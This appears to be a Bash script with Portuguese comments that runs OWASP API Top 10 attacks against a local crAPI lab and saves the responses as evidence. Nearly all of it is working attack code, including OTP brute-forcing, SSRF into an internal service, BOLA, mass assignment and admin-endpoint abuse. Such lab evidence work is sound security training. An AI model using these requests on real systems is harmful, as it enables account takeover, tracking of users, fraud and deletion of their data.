#!/usr/bin/env bash
#
# Executa cada ataque do OWASP API Security Top 10 contra uma instância LOCAL do crAPI
# e salva a requisição + a resposta real em evidencias/<vuln>/captura.txt.
#
# Pré-requisitos:
#   - crAPI rodando localmente (ver docs/00-ambiente-crapi.md)
#   - duas contas registradas (vítima e atacante)
#
# Uso:
#   BASE_URL=http://localhost:8888 \
#   EMAIL_VITIMA=vitima@teste.local SENHA_VITIMA='...' \
#   EMAIL_ATACANTE=atacante@teste.local SENHA_ATACANTE='...' \
#   bash scripts/capturar-evidencias.sh
#
# ATENÇÃO: alguns passos alteram estado (reset de senha da vítima, devolução de
# pedido, exclusão de vídeo). Rode apenas contra o ambiente de laboratório.

set -u

BASE_URL="${BASE_URL:-http://localhost:8888}"
MAILHOG_URL="${MAILHOG_URL:-http://localhost:8025}"
EMAIL_VITIMA="${EMAIL_VITIMA:-vitima@teste.local}"
SENHA_VITIMA="${SENHA_VITIMA:-Vitima@2026!}"
EMAIL_ATACANTE="${EMAIL_ATACANTE:-atacante@teste.local}"
SENHA_ATACANTE="${SENHA_ATACANTE:-Atacante@2026!}"

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
EV="$ROOT/evidencias"

login() {
  curl -s -X POST "$BASE_URL/identity/api/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$1\",\"password\":\"$2\"}" | sed -E 's/.*"token":"([^"]+)".*/\1/'
}

hr() { printf '%s\n' "----------------------------------------------------------------"; }

echo "Autenticando..."
ATOK="$(login "$EMAIL_ATACANTE" "$SENHA_ATACANTE")"
VTOK="$(login "$EMAIL_VITIMA" "$SENHA_VITIMA")"
if [ -z "$ATOK" ] || [ -z "$VTOK" ]; then
  echo "ERRO: falha ao autenticar. Confira credenciais e se o crAPI está no ar." >&2
  exit 1
fi

############################################################
# 03 - Excessive Data Exposure (feito primeiro: alimenta BOLA)
############################################################
OUT="$EV/03-excessive-data-exposure/captura.txt"
{
  echo "# Excessive Data Exposure (API3) — posts da comunidade vazam dados sensíveis"
  echo "# Requisição:"
  echo "GET $BASE_URL/community/api/v2/community/posts/recent  (Authorization: Bearer <atacante>)"
  hr; echo "# Resposta:"
  curl -s "$BASE_URL/community/api/v2/community/posts/recent" -H "Authorization: Bearer $ATOK"
  echo; hr
  echo "# Prova: cada 'author' expõe 'email' e 'vehicleid' — campos que a UI do fórum não mostra."
} > "$OUT"
echo "[ok] 03 Excessive Data Exposure -> $OUT"

# extrai o vehicleid e o email de uma vítima real (primeiro autor)
VICTIM_VEHICLE="$(curl -s "$BASE_URL/community/api/v2/community/posts/recent" -H "Authorization: Bearer $ATOK" | grep -oE '"vehicleid":"[^"]+"' | head -1 | cut -d'"' -f4)"
VICTIM_EMAIL="$(curl -s "$BASE_URL/community/api/v2/community/posts/recent" -H "Authorization: Bearer $ATOK" | grep -oE '"email":"[^"]+"' | head -1 | cut -d'"' -f4)"

############################################################
# 01 - BOLA (usa o vehicleid vazado acima)
############################################################
OUT="$EV/01-bola/captura.txt"
{
  echo "# BOLA (API1) — localização do veículo de outro usuário"
  echo "# vehicleid da vítima (vazado via Excessive Data Exposure): $VICTIM_VEHICLE"
  echo "# Requisição (token do ATACANTE):"
  echo "GET $BASE_URL/identity/api/v2/vehicle/$VICTIM_VEHICLE/location"
  hr; echo "# Resposta:"
  curl -s "$BASE_URL/identity/api/v2/vehicle/$VICTIM_VEHICLE/location" -H "Authorization: Bearer $ATOK"
  echo; hr
  echo "# Prova: retorna latitude/longitude + nome + email de um veículo que não é do atacante."
} > "$OUT"
echo "[ok] 01 BOLA -> $OUT"

############################################################
# 05 - SSRF (contact_mechanic -> serviço interno MailHog)
############################################################
OUT="$EV/05-ssrf/captura.txt"
{
  echo "# SSRF (API7) — contact_mechanic força o servidor a buscar um destino arbitrário"
  echo "# Requisição (mechanic_api aponta para serviço INTERNO, inacessível ao atacante):"
  echo "POST $BASE_URL/workshop/api/merchant/contact_mechanic"
  echo '  body: {"mechanic_code":"TRAC_JHN","problem_details":"teste",'
  echo '         "mechanic_api":"http://mailhog:8025/api/v2/messages","vin":"...","number_of_repeats":1}'
  hr; echo "# Resposta (trecho):"
  curl -s -X POST "$BASE_URL/workshop/api/merchant/contact_mechanic" \
    -H "Authorization: Bearer $ATOK" -H "Content-Type: application/json" \
    -d '{"mechanic_code":"TRAC_JHN","problem_details":"teste","mechanic_api":"http://mailhog:8025/api/v2/messages","vin":"0JATXVG6ESXV0HX6R","number_of_repeats":1}' | head -c 1200
  echo; hr
  echo "# Prova: 'response_from_mechanic_api' traz o conteúdo do serviço interno (e-mails do MailHog)."
} > "$OUT"
echo "[ok] 05 SSRF -> $OUT"

############################################################
# 02 - Broken Authentication (OTP sem rate limit + reset)
############################################################
OUT="$EV/02-broken-authentication/captura.txt"
{
  echo "# Broken Authentication (API2) — brute-force de OTP no reset de senha"
  echo "# 1) dispara OTP:"
  curl -s -X POST "$BASE_URL/identity/api/auth/forget-password" -H "Content-Type: application/json" -d "{\"email\":\"$EMAIL_VITIMA\"}"
  echo; hr
  echo "# 2) 30 tentativas com OTP errado -> distribuição de status (sem bloqueio = brute-force viável):"
  for i in $(seq 1 30); do
    curl -s -o /dev/null -w "%{http_code}\n" -X POST "$BASE_URL/identity/api/auth/v3/check-otp" \
      -H "Content-Type: application/json" \
      -d "{\"email\":\"$EMAIL_VITIMA\",\"otp\":\"0$(printf '%03d' $i)\",\"password\":\"X\"}"
  done | sort | uniq -c
  hr
  echo "# Prova: nenhuma resposta 429/bloqueio; OTP de 4 dígitos (10.000 combinações) é forçável."
} > "$OUT"
echo "[ok] 02 Broken Authentication -> $OUT"

############################################################
# 04 - Mass Assignment (compra + 'devolução' que reembolsa)
############################################################
OUT="$EV/04-mass-assignment/captura.txt"
{
  echo "# Mass Assignment (API3) — reembolso de item nunca devolvido"
  CRED_ANTES="$(curl -s "$BASE_URL/workshop/api/shop/products" -H "Authorization: Bearer $VTOK" | grep -oE '"credit":[0-9.]+')"
  echo "# crédito antes: $CRED_ANTES"
  echo "# 1) compra um produto:"
  BUY="$(curl -s -X POST "$BASE_URL/workshop/api/shop/orders" -H "Authorization: Bearer $VTOK" -H "Content-Type: application/json" -d '{"product_id":1,"quantity":1}')"
  echo "$BUY"
  OID="$(echo "$BUY" | grep -oE '"id":[0-9]+' | head -1 | cut -d: -f2)"
  echo "# order id: $OID"
  hr
  echo "# 2) edita o pedido injetando status 'returned' (campo que o cliente não deveria controlar):"
  echo "PUT $BASE_URL/workshop/api/shop/orders/$OID   body: {\"status\":\"returned\"}"
  curl -s -X PUT "$BASE_URL/workshop/api/shop/orders/$OID" -H "Authorization: Bearer $VTOK" -H "Content-Type: application/json" -d '{"status":"returned"}' | head -c 400
  echo; hr
  CRED_DEPOIS="$(curl -s "$BASE_URL/workshop/api/shop/products" -H "Authorization: Bearer $VTOK" | grep -oE '"credit":[0-9.]+')"
  echo "# crédito depois: $CRED_DEPOIS"
  echo "# Prova: crédito reembolsado sem devolução física; item fica de graça."
} > "$OUT"
echo "[ok] 04 Mass Assignment -> $OUT"

############################################################
# 06 - BFLA (usuário comum deleta vídeo via endpoint de admin)
############################################################
OUT="$EV/06-bfla/captura.txt"
{
  echo "# BFLA (API5) — usuário comum executa função de admin"
  echo "# 1) a vítima faz upload de um vídeo:"
  TMP="$(mktemp)"; printf 'FAKEVIDEOCONTENT1234567890' > "$TMP"
  UP="$(curl -s -X POST "$BASE_URL/identity/api/v2/user/videos" -H "Authorization: Bearer $VTOK" -F "file=@$TMP")"
  echo "$UP"
  VIDID="$(echo "$UP" | grep -oE '"id":[0-9]+' | head -1 | cut -d: -f2)"
  rm -f "$TMP"
  echo "# video id da vítima: $VIDID"
  hr
  echo "# 2) role do atacante:"
  curl -s "$BASE_URL/identity/api/v2/user/dashboard" -H "Authorization: Bearer $ATOK" | grep -oE '"role":"[A-Z_]+"'
  echo "# 3) atacante (ROLE_USER) deleta o vídeo da vítima via endpoint de ADMIN:"
  echo "DELETE $BASE_URL/identity/api/v2/admin/videos/$VIDID"
  curl -s -w "\n[HTTP %{http_code}]\n" -X DELETE "$BASE_URL/identity/api/v2/admin/videos/$VIDID" -H "Authorization: Bearer $ATOK"
  hr
  echo "# Prova: função administrativa executada com token de usuário comum."
} > "$OUT"
echo "[ok] 06 BFLA -> $OUT"

echo
echo "Concluído. Evidências em $EV/*/captura.txt"
